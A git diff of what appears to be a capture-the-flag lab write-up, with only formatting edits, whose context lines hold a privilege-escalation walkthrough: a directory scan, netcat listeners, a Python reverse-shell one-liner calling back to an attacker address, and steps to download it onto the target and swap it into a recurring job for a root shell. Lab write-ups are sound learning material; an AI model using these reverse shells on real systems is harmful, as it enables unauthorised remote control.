@@ -25,8 +25,6 @@ feroxbuster -u http://10.10.10.68 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7c07f5a-dc65-41f9-983c-1aa0f5697877)
 
-
-
 + Get revershell:
 + `nc -lnvp 4444`
 ```
@@ -56,7 +54,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 + Even `test.txt` file name is changed, exists `test.txt` the same file name each minute again.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/49b004f3-46e8-42d6-b672-4765d0cd1df4)
 
-+ Create `test.py file` on your attack machine:
++ Create `test.py` revershell payload file on your attack machine:
 ```
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
@@ -64,7 +62,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 + Start listener: `nc lnvp 5555`
 + Transfer it to target machine: `python3 -m http.server`
 + Download `wget 10.10.14.5:8000/test.py` and change the name.
-+ Get the root shell
++ Get the root shell:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1b923d8-5e44-4c00-b9ab-c0405253686a)
 
 
